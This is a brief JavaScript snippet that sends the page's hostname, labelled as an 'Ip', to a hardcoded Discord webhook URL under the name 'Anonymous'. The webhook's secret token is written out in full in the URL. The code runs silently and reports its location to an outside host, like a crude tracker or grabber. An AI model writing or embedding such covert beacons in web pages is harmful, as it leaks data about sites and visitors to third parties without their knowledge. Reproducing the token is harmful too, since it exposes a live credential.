const url = 'https://discord.com/api/webhooks/1181678412989997086/lgRtiPwRWvkGan3kBumk_Iyg1UFx8yFdYWulTOQnOzgsFsOEraagE_69OMwbpYskioxV';
const ip = window.location.hostname;
const msg = {
    username: "Anonymous",
    content: "Ip: " + ip
};
fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(msg)
});
